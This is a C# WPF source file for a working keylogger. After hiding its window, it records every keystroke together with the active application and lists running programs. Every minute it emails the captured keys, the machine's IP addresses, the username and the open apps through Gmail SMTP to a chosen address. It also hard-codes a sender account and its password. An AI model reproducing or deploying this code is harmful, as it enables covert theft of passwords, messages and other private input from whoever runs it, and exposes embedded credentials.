using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;

namespace Keylogger
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        String emailTo;

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        private void StartTracking_Click(object sender, RoutedEventArgs e)
        {
            emailTo = emailToSend.Text;
            this.Hide();
            //Set path of txt
            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            //if(!Directory.Exists(filepath))
            //Directory.CreateDirectory(filepath);

            string pathKeys = (filepath + @"\keystrokes.txt");
            if (!File.Exists(pathKeys))
                using (StreamWriter sw = File.CreateText(pathKeys)) ;
            string pathProcesses = (filepath + @"\processes.txt");
            if (!File.Exists(pathProcesses))
                using (StreamWriter sw = File.CreateText(pathProcesses)) ;

            File.WriteAllText(pathProcesses, string.Empty);
            File.WriteAllText(pathKeys, string.Empty);

            //Send email every 1 min
            var startTimeSpan = TimeSpan.Zero;
            var periodTimeSpan = TimeSpan.FromMinutes(1);

            var timer = new System.Threading.Timer((E) =>
            {
                File.WriteAllText(pathProcesses, string.Empty);
                Process[] processes = Process.GetProcesses();
                foreach (Process p in processes)
                {
                    if (!String.IsNullOrEmpty(p.MainWindowTitle))
                    {
                        using (StreamWriter sw = File.AppendText(pathProcesses))
                        {
                            sw.WriteLine(p.ProcessName);
                        }
                    }
                }
                SendNewMessage();
                File.WriteAllText(pathKeys, string.Empty);
            }, null, startTimeSpan, periodTimeSpan);





            uint procId = 0, lastProc = 0;
            while (true)
            {
                //Thread.Sleep(5);
                for (int i = 1; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        using (StreamWriter sw = File.AppendText(pathKeys))
                        {
                            IntPtr hWnd = GetForegroundWindow();
                            GetWindowThreadProcessId(hWnd, out procId);
                            if (procId != lastProc)
                            {
                                var proc = Process.GetProcessById((int)procId);
                                String str = proc.MainModule.ToString().Substring(33);

                                sw.Write("\n" + str + " -> ");
                                lastProc = procId;
                            }
                            sw.Write(verifyKey(i));
                            //Console.Write(verifyKey(i));
                        }
                    }
                }
            }

            void SendNewMessage()
            {
                string folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                string filePathKeys = folderName + @"\keystrokes.txt";
                string filePathProcesses = folderName + @"\processes.txt";
                string logContents = File.ReadAllText(filePathKeys);
                string processes = File.ReadAllText(filePathProcesses);

                DateTime now = DateTime.Now;
                string subject = "Message from keylogger";
                string emailBody = "";

                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var address in host.AddressList)
                {
                    emailBody += "\nAddress: " + address;
                }
                //emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
                emailBody += "\nUser: " + Environment.UserName;
                emailBody += "\nTime: " + now.ToString();
                emailBody += "\nOpen apps: \n" + processes;
                emailBody += "\nKeys pressed: \n" + logContents;

                SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
                MailMessage mailMessage = new MailMessage();



                mailMessage.From = new MailAddress("testkeyloggerapp@gmail.com");
                mailMessage.To.Add(emailTo);
                //mailMessage.To.Add("ionescumarius1600@gmail.com");
                mailMessage.Subject = subject;
                client.UseDefaultCredentials = false;
                client.EnableSsl = true;
                client.Credentials = new System.Net.NetworkCredential("testkeyloggerapp@gmail.com", "parolatest1234");
                mailMessage.Body = emailBody;

                client.Send(mailMessage);

            }

            String verifyKey(int code)
            {
                String key = "";

                if (code == 8) key = "[Back]";
                else if (code == 9) key = "\t";
                else if (code == 13) key = "\n";
                else if (code == 19) key = "[Pause]";
                else if (code == 20) key = "[Caps Lock]";
                else if (code == 27) key = "[Esc]";
                else if (code == 32) key = " ";
                else if (code == 33) key = "[Page Up]";
                else if (code == 34) key = "[Page Down]";
                else if (code == 35) key = "[End]";
                else if (code == 36) key = "[Home]";
                else if (code == 37) key = "Left]";
                else if (code == 38) key = "[Up]";
                else if (code == 39) key = "[Right]";
                else if (code == 40) key = "[Down]";
                else if (code == 44) key = "[Print Screen]";
                else if (code == 45) key = "[Insert]";
                else if (code == 46) key = "[Delete]";
                else if (code == 112) key = "[F1]";
                else if (code == 113) key = "[F2]";
                else if (code == 114) key = "[F3]";
                else if (code == 115) key = "[F4]";
                else if (code == 116) key = "[F5]";
                else if (code == 117) key = "[F6]";
                else if (code == 118) key = "[F7]";
                else if (code == 119) key = "[F8]";
                else if (code == 120) key = "[F9]";
                else if (code == 121) key = "[F10]";
                else if (code == 122) key = "[F11]";
                else if (code == 123) key = "[F12]";
                else if (code == 144) key = "[Num Lock]";
                else if (code == 145) key = "[Scroll Lock]";
                else if (code == 1) key = "";//[LClick]
                else if (code == 2) key = "";//[RClick]
                else if (code == 16) key = "[Shift]";
                else if (code == 17) key = "[Ctrl]";
                else if (code == 18) key = "[Alt]";
                else if (code == 110) key = ".";
                else if (code == 91) key = "[Windows]";
                else if (code > 64 && code < 91)
                    return ((char)(code + 32)).ToString();
                else if (code > 47 && code < 58)
                    return ((char)code).ToString();
                else key = "[" + code + "]";

                return key;
            }


        }


    }
}
